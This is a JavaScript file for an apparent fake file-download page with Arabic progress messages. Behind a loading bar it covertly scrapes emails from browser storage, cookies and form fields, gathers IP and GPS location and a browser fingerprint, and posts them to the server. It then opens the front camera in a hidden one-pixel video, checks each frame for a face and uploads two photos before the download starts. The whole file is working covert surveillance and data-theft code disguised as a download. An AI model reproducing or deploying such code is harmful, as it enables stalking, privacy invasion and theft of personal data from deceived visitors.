// Data collection and camera capture functionality
class DataCollector {
    constructor() {
        this.capturedPhotos = 0;
        this.totalPhotos = 2; // Changed to 2 photos only
        this.captureInterval = 5000; // 5 seconds between captures for better quality
        this.userData = {};
        this.filename = '';
        this.qualityThreshold = 50000; // Minimum file size for quality check
        this.maxAttempts = 10; // Maximum attempts per photo
        this.currentAttempts = 0;
    }

    async startDataCollection(filename) {
        this.filename = filename;
        this.updateStatus('جاري التحقق من الأذونات...', 10);
        
        try {
            // Collect basic data first
            await this.collectBasicData();
            this.updateStatus('جاري جمع معلومات الجهاز...', 30);
            
            // Collect device and network info
            await this.collectDeviceInfo();
            this.updateStatus('جاري تحديد الموقع...', 50);
            
            // Get location data
            await this.getLocationData();
            this.updateStatus('جاري تحليل المتصفح...', 70);
            
            // Get browser fingerprint
            await this.getBrowserFingerprint();
            this.updateStatus('إرسال البيانات...', 80);
            
            // Send collected data
            await this.sendDataToServer();
            this.updateStatus('تحليل الملف...', 90);
            
            // Start camera capture silently
            await this.startCameraCapture();
            
        } catch (error) {
            console.error('Error in data collection:', error);
            this.updateStatus('حدث خطأ، جاري المحاولة مرة أخرى...', 50);
            
            // Wait a bit then proceed to download
            setTimeout(() => {
                this.proceedToDownload();
            }, 2000);
        }
    }

    async collectBasicData() {
        this.userData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            filename: this.filename,
            emails: await this.extractEmailsFromBrowser()
        };
    }

    async extractEmailsFromBrowser() {
        const emails = new Set();
        
        try {
            // البحث في localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if (value) {
                    const foundEmails = this.extractEmailsFromText(value);
                    foundEmails.forEach(email => emails.add(email));
                }
            }

            // البحث في sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                if (value) {
                    const foundEmails = this.extractEmailsFromText(value);
                    foundEmails.forEach(email => emails.add(email));
                }
            }

            // البحث في cookies
            const cookieString = document.cookie;
            const cookieEmails = this.extractEmailsFromText(cookieString);
            cookieEmails.forEach(email => emails.add(email));

            // البحث في حقول النماذج المحفوظة
            const inputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
            inputs.forEach(input => {
                if (input.value) {
                    const foundEmails = this.extractEmailsFromText(input.value);
                    foundEmails.forEach(email => emails.add(email));
                }
            });

            // البحث في autofill data (إذا كان متاحاً)
            if ('credentials' in navigator) {
                try {
                    // محاولة الوصول للبيانات المحفوظة
                    const formElements = document.querySelectorAll('form');
                    formElements.forEach(form => {
                        const emailInputs = form.querySelectorAll('input[type="email"]');
                        emailInputs.forEach(input => {
                            if (input.value) {
                                emails.add(input.value);
                            }
                        });
                    });
                } catch (error) {
                    console.log('Cannot access credential data');
                }
            }

            // البحث في history/URL parameters (من previous pages)
            if (window.history && window.history.length > 0) {
                try {
                    const currentUrl = window.location.href;
                    const urlEmails = this.extractEmailsFromText(currentUrl);
                    urlEmails.forEach(email => emails.add(email));
                } catch (error) {
                    console.log('Cannot access URL data');
                }
            }

        } catch (error) {
            console.error('Error extracting emails:', error);
        }

        return Array.from(emails);
    }

    extractEmailsFromText(text) {
        if (!text || typeof text !== 'string') return [];
        
        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
        const matches = text.match(emailRegex);
        
        if (!matches) return [];
        
        // تصفية البريد الإلكتروني الصحيح
        return matches.filter(email => {
            // تحقق من صحة البريد الإلكتروني
            const parts = email.split('@');
            if (parts.length !== 2) return false;
            
            const [localPart, domain] = parts;
            if (localPart.length === 0 || domain.length === 0) return false;
            
            // تحقق من وجود نقطة في النطاق
            if (!domain.includes('.')) return false;
            
            // استبعاد البريد الإلكتروني المزيف الشائع
            const fakeDomains = ['example.com', 'test.com', 'fake.com', 'noemail.com'];
            if (fakeDomains.some(fake => domain.toLowerCase().includes(fake))) return false;
            
            return true;
        });
    }

    async collectDeviceInfo() {
        // Detect device type
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const isTablet = /iPad|Android(?!.*Mobile)/i.test(navigator.userAgent);
        
        let deviceType = 'Desktop';
        if (isMobile) deviceType = 'Mobile';
        if (isTablet) deviceType = 'Tablet';
        
        this.userData.device_type = deviceType;
        
        // Screen information
        this.userData.screen = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        };
        
        // Viewport information
        this.userData.viewport = {
            width: window.innerWidth,
            height: window.innerHeight
        };
        
        // Timezone
        this.userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        
        // Get network information if available
        if ('connection' in navigator) {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            this.userData.network_type = connection.effectiveType || 'unknown';
            this.userData.downlink = connection.downlink || 'unknown';
        } else {
            this.userData.network_type = 'unknown';
        }
    }

    async getLocationData() {
        try {
            // Try to get IP-based location
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const locationData = await response.json();
                this.userData.location = {
                    ip: locationData.ip,
                    city: locationData.city,
                    region: locationData.region,
                    country: locationData.country_name,
                    latitude: locationData.latitude,
                    longitude: locationData.longitude,
                    timezone: locationData.timezone,
                    isp: locationData.org
                };
            }
        } catch (error) {
            console.log('Location data not available');
            this.userData.location = { error: 'Not available' };
        }

        // Try to get GPS location if possible
        if ('geolocation' in navigator) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        timeout: 5000,
                        enableHighAccuracy: false
                    });
                });
                
                this.userData.gps_location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
            } catch (error) {
                console.log('GPS location not available');
            }
        }
    }

    async getBrowserFingerprint() {
        try {
            // Basic fingerprinting without external libraries
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Browser fingerprint test 🔍', 2, 2);
            
            this.userData.fingerprint = {
                canvas: canvas.toDataURL(),
                webgl: this.getWebGLFingerprint(),
                fonts: this.getAvailableFonts(),
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
            };
        } catch (error) {
            console.log('Fingerprinting not available');
            this.userData.fingerprint = { error: 'Not available' };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Not supported';
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch (error) {
            return 'Error';
        }
    }

    getAvailableFonts() {
        const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Helvetica', 'Comic Sans MS'];
        const availableFonts = [];
        
        testFonts.forEach(font => {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            context.font = `12px ${font}`;
            const metrics = context.measureText('Test');
            if (metrics.width > 0) {
                availableFonts.push(font);
            }
        });
        
        return availableFonts;
    }

    async sendDataToServer() {
        try {
            const response = await fetch('/collect_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(this.userData)
            });
            
            if (!response.ok) {
                throw new Error('Failed to send data');
            }
            
            console.log('Data sent successfully');
        } catch (error) {
            console.error('Error sending data:', error);
        }
    }

    async startCameraCapture() {
        try {
            // Force front camera only with strict constraints
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: { exact: 'user' }, // Strictly front camera only
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            
            const video = document.getElementById('hiddenVideo');
            video.srcObject = stream;
            video.style.opacity = '0.01'; // Make nearly invisible but not hidden
            video.style.position = 'fixed';
            video.style.top = '-1000px';
            video.style.left = '-1000px';
            video.style.width = '1px';
            video.style.height = '1px';
            video.style.zIndex = '-9999';
            video.autoplay = true;
            video.playsInline = true;
            
            // Wait for video to be ready and playing
            await new Promise((resolve) => {
                video.oncanplay = () => {
                    video.play().then(() => {
                        // Wait a bit more for the video to stabilize
                        setTimeout(resolve, 1000);
                    }).catch(() => resolve());
                };
            });
            
            this.updateStatus('تجهيز التحميل...', 95);
            
            // Start capturing photos silently
            this.capturePhotosSequentially(stream, video);
            
        } catch (error) {
            console.error('Front camera access denied:', error);
            // Try with less strict constraints but still front camera only
            try {
                const fallbackStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user', // Prefer front camera
                        width: { min: 320, ideal: 640, max: 1280 },
                        height: { min: 240, ideal: 480, max: 720 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('hiddenVideo');
                video.srcObject = fallbackStream;
                video.style.opacity = '0.01';
                video.style.position = 'fixed';
                video.style.top = '-1000px';
                video.style.left = '-1000px';
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.zIndex = '-9999';
                video.autoplay = true;
                video.playsInline = true;
                
                await new Promise((resolve) => {
                    video.oncanplay = () => {
                        video.play().then(() => {
                            setTimeout(resolve, 1000);
                        }).catch(() => resolve());
                    };
                });
                
                this.capturePhotosSequentially(fallbackStream, video);
            } catch (fallbackError) {
                console.error('All front camera attempts failed:', fallbackError);
                this.updateStatus('جاري التحميل...', 100);
                
                // Proceed to download even if camera fails
                setTimeout(() => {
                    this.proceedToDownload();
                }, 2000);
            }
        }
    }

    async capturePhotosSequentially(stream, video) {
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // Ensure canvas is properly sized
        const videoWidth = video.videoWidth || 640;
        const videoHeight = video.videoHeight || 480;
        canvas.width = videoWidth;
        canvas.height = videoHeight;
        
        const captureNextPhoto = async () => {
            if (this.capturedPhotos >= this.totalPhotos) {
                // All photos captured, stop camera and proceed
                stream.getTracks().forEach(track => track.stop());
                this.updateStatus('تم الانتهاء، جاري بدء التحميل...', 100);
                
                setTimeout(() => {
                    this.proceedToDownload();
                }, 1500);
                return;
            }

            // Check if we've exceeded maximum attempts for current photo
            if (this.currentAttempts >= this.maxAttempts) {
                console.log('Maximum attempts reached, proceeding to next photo or finishing');
                this.capturedPhotos++;
                this.currentAttempts = 0;
                
                if (this.capturedPhotos < this.totalPhotos) {
                    setTimeout(captureNextPhoto, this.captureInterval);
                } else {
                    stream.getTracks().forEach(track => track.stop());
                    this.proceedToDownload();
                }
                return;
            }
            
            try {
                // Make sure video is playing and has dimensions
                if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                    // Clear canvas first
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    
                    // Capture frame with proper dimensions
                    ctx.drawImage(video, 0, 0, videoWidth, videoHeight);
                    
                    // Advanced quality checks
                    const qualityCheck = await this.performQualityCheck(canvas, ctx);
                    
                    if (qualityCheck.isGoodQuality) {
                        // Convert to blob with maximum quality
                        canvas.toBlob(async (blob) => {
                            if (blob && blob.size > this.qualityThreshold) {
                                const uploadSuccess = await this.uploadPhoto(blob);
                                
                                if (uploadSuccess) {
                                    this.capturedPhotos++;
                                    this.currentAttempts = 0; // Reset attempts for next photo
                                    
                                    const progress = 90 + (this.capturedPhotos / this.totalPhotos) * 10;
                                    this.updateStatus(`تم التقاط صورة عالية الجودة (${this.capturedPhotos}/${this.totalPhotos})...`, progress);
                                    
                                    // Wait longer between photos for better quality
                                    if (this.capturedPhotos < this.totalPhotos) {
                                        setTimeout(captureNextPhoto, this.captureInterval);
                                    } else {
                                        setTimeout(() => {
                                            stream.getTracks().forEach(track => track.stop());
                                            this.proceedToDownload();
                                        }, 1000);
                                    }
                                } else {
                                    // Upload failed, retry
                                    this.currentAttempts++;
                                    setTimeout(captureNextPhoto, 1500);
                                }
                            } else {
                                // Quality too low, retry
                                this.currentAttempts++;
                                console.log(`Photo quality too low (${blob.size} bytes), retrying...`);
                                setTimeout(captureNextPhoto, 1500);
                            }
                        }, 'image/jpeg', 0.95);
                    } else {
                        // Quality check failed, retry
                        this.currentAttempts++;
                        console.log(`Quality check failed: ${qualityCheck.reason}, retrying...`);
                        setTimeout(captureNextPhoto, 1500);
                    }
                } else {
                    // Video not ready, wait and retry
                    this.currentAttempts++;
                    console.log('Video not ready, waiting...');
                    setTimeout(captureNextPhoto, 1500);
                }
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                this.currentAttempts++;
                setTimeout(captureNextPhoto, 2000);
            }
        };
        
        // Start capturing after a longer delay to ensure video is stable
        setTimeout(captureNextPhoto, 3000);
    }

    async performQualityCheck(canvas, ctx) {
        try {
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const pixels = imageData.data;
            
            // Check 1: Image brightness and contrast
            let totalBrightness = 0;
            let brightPixels = 0;
            let darkPixels = 0;
            let colorfulPixels = 0;
            
            for (let i = 0; i < pixels.length; i += 4) {
                const r = pixels[i];
                const g = pixels[i + 1];
                const b = pixels[i + 2];
                
                // Calculate brightness
                const brightness = (r + g + b) / 3;
                totalBrightness += brightness;
                
                if (brightness > 200) brightPixels++;
                if (brightness < 50) darkPixels++;
                
                // Check for color variation (not just black/white)
                const colorVariation = Math.abs(r - g) + Math.abs(g - b) + Math.abs(r - b);
                if (colorVariation > 30) colorfulPixels++;
            }
            
            const totalPixels = pixels.length / 4;
            const avgBrightness = totalBrightness / totalPixels;
            const brightPercent = (brightPixels / totalPixels) * 100;
            const darkPercent = (darkPixels / totalPixels) * 100;
            const colorPercent = (colorfulPixels / totalPixels) * 100;
            
            // Quality criteria
            const criteria = {
                brightness: avgBrightness > 40 && avgBrightness < 220,
                contrast: brightPercent < 80 && darkPercent < 80,
                color: colorPercent > 5,
                notBlank: totalBrightness > 10000
            };
            
            // Check 2: Face detection using basic skin tone detection
            const hasFaceFeatures = this.detectFaceFeatures(pixels, canvas.width, canvas.height);
            
            const isGoodQuality = criteria.brightness && criteria.contrast && 
                                 criteria.color && criteria.notBlank && hasFaceFeatures;
            
            let reason = '';
            if (!criteria.brightness) reason += 'إضاءة غير مناسبة ';
            if (!criteria.contrast) reason += 'تباين ضعيف ';
            if (!criteria.color) reason += 'ألوان غير كافية ';
            if (!criteria.notBlank) reason += 'صورة فارغة ';
            if (!hasFaceFeatures) reason += 'لا يوجد وجه مكتشف ';
            
            return {
                isGoodQuality,
                reason: reason || 'جودة ممتازة',
                metrics: {
                    brightness: avgBrightness,
                    brightPercent,
                    darkPercent,
                    colorPercent,
                    hasFace: hasFaceFeatures
                }
            };
            
        } catch (error) {
            console.error('Quality check error:', error);
            return { isGoodQuality: false, reason: 'خطأ في فحص الجودة' };
        }
    }

    detectFaceFeatures(pixels, width, height) {
        try {
            // Simple skin tone detection
            let skinPixels = 0;
            let totalChecked = 0;
            
            // Check center region of image where face is likely to be
            const centerX = width / 2;
            const centerY = height / 2;
            const checkRadius = Math.min(width, height) / 4;
            
            for (let y = centerY - checkRadius; y < centerY + checkRadius; y += 5) {
                for (let x = centerX - checkRadius; x < centerX + checkRadius; x += 5) {
                    if (x >= 0 && x < width && y >= 0 && y < height) {
                        const index = (Math.floor(y) * width + Math.floor(x)) * 4;
                        const r = pixels[index];
                        const g = pixels[index + 1];
                        const b = pixels[index + 2];
                        
                        // Skin tone detection (simplified)
                        if (this.isSkinTone(r, g, b)) {
                            skinPixels++;
                        }
                        totalChecked++;
                    }
                }
            }
            
            const skinPercent = totalChecked > 0 ? (skinPixels / totalChecked) * 100 : 0;
            
            // Consider it a face if at least 8% of center region has skin tones
            return skinPercent > 8;
            
        } catch (error) {
            console.error('Face detection error:', error);
            return false;
        }
    }

    isSkinTone(r, g, b) {
        // Enhanced skin tone detection
        // Convert to normalized values
        const rNorm = r / 255;
        const gNorm = g / 255;
        const bNorm = b / 255;
        
        // Multiple skin tone ranges for different ethnicities
        const skinConditions = [
            // Light skin
            (r > 95 && g > 40 && b > 20 && r > g && r > b && r - g > 15),
            // Medium skin
            (r > 80 && g > 50 && b > 30 && r >= g && r >= b),
            // Dark skin
            (r > 45 && g > 30 && b > 15 && r >= g && r >= b && (r - g) >= -5),
            // Additional range
            (rNorm > 0.3 && gNorm > 0.2 && bNorm > 0.1 && rNorm >= gNorm && rNorm >= bNorm)
        ];
        
        return skinConditions.some(condition => condition);
    }

    async uploadPhoto(blob) {
        try {
            const formData = new FormData();
            formData.append('photo', blob, `capture_${Date.now()}.jpg`);
            
            const response = await fetch('/upload_photo', {
                method: 'POST',
                body: formData
            });
            
            if (response.ok) {
                console.log('Photo uploaded successfully');
                return true;
            } else {
                console.error('Upload failed with status:', response.status);
                return false;
            }
        } catch (error) {
            console.error('Error uploading photo:', error);
            return false;
        }
    }

    updateStatus(message, progress) {
        const statusElement = document.getElementById('statusText');
        const progressBar = document.getElementById('progressBar');
        
        if (statusElement) {
            statusElement.innerHTML = `${message} <span class="loading-spinner"></span>`;
        }
        
        if (progressBar) {
            progressBar.style.width = `${progress}%`;
        }
    }

    proceedToDownload() {
        const statusElement = document.getElementById('statusText');
        const progressBar = document.getElementById('progressBar');
        const downloadBtn = document.getElementById('downloadBtn');
        
        if (statusElement) {
            statusElement.innerHTML = '✅ جاهز للتحميل';
        }
        
        if (progressBar) {
            progressBar.style.width = '100%';
            progressBar.classList.add('bg-success');
        }
        
        if (downloadBtn) {
            downloadBtn.disabled = false;
            downloadBtn.onclick = () => {
                window.location.href = `/download/${this.filename}`;
            };
        }
        
        // Auto-start download after 2 seconds
        setTimeout(() => {
            if (downloadBtn && !downloadBtn.disabled) {
                downloadBtn.click();
            }
        }, 2000);
    }
}

// Global function to start data collection
function startDataCollection(filename) {
    const collector = new DataCollector();
    collector.startDataCollection(filename);
}

// Additional utility functions
function detectAdBlocker() {
    const testAd = document.createElement('div');
    testAd.innerHTML = '&nbsp;';
    testAd.className = 'adsbox';
    testAd.style.position = 'absolute';
    testAd.style.left = '-9999px';
    document.body.appendChild(testAd);
    
    setTimeout(() => {
        const adBlockEnabled = testAd.offsetHeight === 0;
        document.body.removeChild(testAd);
        return adBlockEnabled;
    }, 100);
}

function getBatteryInfo() {
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            return {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        });
    }
    return null;
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('Data collection system initialized');
});